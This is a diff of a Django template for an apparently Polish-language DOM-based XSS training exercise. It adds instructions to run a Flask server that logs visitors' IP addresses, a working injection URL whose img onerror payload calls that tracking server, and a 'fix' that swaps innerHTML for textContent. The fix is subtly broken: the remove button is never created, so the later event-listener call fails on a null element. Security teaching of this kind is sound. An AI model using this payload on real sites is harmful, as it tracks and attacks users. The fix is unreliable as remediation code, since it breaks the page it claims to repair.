@@ -9,11 +9,70 @@
     <title>DOM based XSS</title>
     <link rel="stylesheet" href="{% static 'app/stored.css' %}">
 </head>
+<style>
+
+
+</style>
 <body>
     <h1>DOM based XSS</h1>
     <div class="container">
         <div class="text-section">
             <h2>Instrukcja</h2>
+
+            <!-- Pierwsza część zadania -->
+            <h3>Część 1: Wykrywanie podatności</h3>
+            <p>
+                Twoim celem jest przetestowanie podatności tej podstrony na atak <strong>DOM-based XSS</strong>.
+            </p>
+            <ul>
+                <li>Serwer Django działa na porcie <code>8000</code>.</li>
+                <li>Przygotuj serwer przechwytujący adresy IP na porcie <code>5000</code>, korzystając z Flaska.</li>
+                <li>Jeśli nie masz Flaska, wykonaj następujące kroki:
+                    <ol>
+                        <li>Upewnij się, że masz zainstalowanego Pythona (sprawdź w terminalu, wpisując <code>python --version</code> lub <code>python3 --version</code>).</li>
+                        <li>Zainstaluj Flask w terminalu:
+                            <pre><code>pip install flask</code></pre>
+                            </li>
+                    </ol>
+                <li>Skorzystaj z poniższego kodu w Pythonie (musisz natomiast uzupełnić funkcję, która pobiera adres IP), aby uruchomić serwer Flask:
+                    <pre><code>
+from flask import Flask, request
+
+app = Flask(__name__)
+
+@app.route('/track-image', methods=['GET'])
+def track_image():
+# Wpisz właściwą metodę, aby uzyskać adres IP klienta (dokumentacja Flask)
+    print(f"Przechwycony adres IP: {...}")
+    return '', 204
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000, debug=True)
+</code></pre>
+                </li>
+                <li>Uruchom powyższy kod, aby rozpocząć nasłuchiwanie na żądania obrazu.</li>
+                <li>
+                    Skonstruuj złośliwy link, który wstrzyknie obraz z obsługą błędu do tej podstrony.
+                    Poniżej znajduje się przykład linku, który należy wkleić w przeglądarce:
+                    
+                </li>
+                <pre><code>
+http://127.0.0.1:8000/app/tasks/dom_xss/?photo=&lt;img src=x onerror="const img=new Image();img.src='http://127.0.0.1:5000/track-image';document.body.appendChild(img);"&gt;
+                </code></pre>
+                <li>
+                    Otwórz złośliwy link w przeglądarce, a Twój serwer Flask powinien zarejestrować adres IP w konsoli.
+                </li>
+            </ul>
+
+            <!-- Druga część zadania -->
+            <h3>Część 2: Naprawa podatności</h3>
+            <ul>
+                <li>Przeanalizuj, jak dane z parametru URL są wstawiane do elementu o identyfikatorze <code>user-photo</code> w pliku <code>dom_xss.html</code>.</li>
+                <li>Upewnij się, że dane użytkownika są traktowane jako tekst, a nie jako kod HTML lub JavaScript, aby zapobiec ich wykonaniu w przeglądarce.</li>
+            </ul>
+            <p style="font-weight: bold;">
+                Ważne: Zademonstruj zarówno przeprowadzenie ataku, jak i poprawioną wersję, która uniemożliwia wykonanie złośliwego kodu.
+            </p>
         </div>
         <div class="dom_based-section">
             <h2>Zdjęcie</h2>
@@ -32,13 +91,13 @@
         const photoFromUrl = params.get("photo");
 
         if (photoFromUrl) {
-            document.getElementById('user-photo').innerHTML = `${photoFromUrl}<button id='remove-photo-button'>Usuń zdjęcie</button>`;
+            document.getElementById('user-photo').textContent = `${photoFromUrl}<button id='remove-photo-button'>Usuń zdjęcie</button>`;
 
             const baseUrl = window.location.origin + window.location.pathname;
             window.history.replaceState({}, document.title, baseUrl);
 
             document.getElementById('remove-photo-button').addEventListener('click', function() {
-                document.getElementById('user-photo').innerHTML = '<input type="file" id="file-input" accept="image/*">';
+                document.getElementById('user-photo').textContent = '<input type="file" id="file-input" accept="image/*">';
                 addFileInputListener();
             });
         }
